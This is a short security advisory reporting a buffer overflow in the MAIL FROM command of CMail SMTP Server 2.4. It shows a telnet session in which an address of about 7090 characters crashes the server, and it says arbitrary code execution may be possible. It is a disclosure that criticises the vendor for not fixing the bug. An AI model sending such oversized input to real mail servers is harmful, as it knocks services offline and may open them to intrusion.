CMail SMTP Server
Version 2.4: 
              Remotely exploitable buffer overflow

CMail SMTP Server Version 2.4 Problem:  We found a buffer overflow in
the CMail SMTP service (long MAIL FROM:)  that may allow an attacker to
execute arbitrary code on the target server, it is based on the eEye
pointed out overflows in cmail 2.3 >:-] Which was never fixed... 
software vendors still not taking security issues seriously.

Example:  

[cham@guilt cham]$ telnet example.com 25 Trying
example.com...
Connected to example.com. Escape character is '^]'.
220 SMTP services ready. Computalynx CMail Server Version: 2.4

250 Hello ussr [yourip], how are you today? 
MAIL FROM: cmail<[buffer]@cmaildotcom.com> 
Where [buffer] is aprox. 7090 characters.
At his point the server overflows and crashes. 


Just a typical buffer overflow that should
have been fixed in version 2.3 when it was pointed out to them.
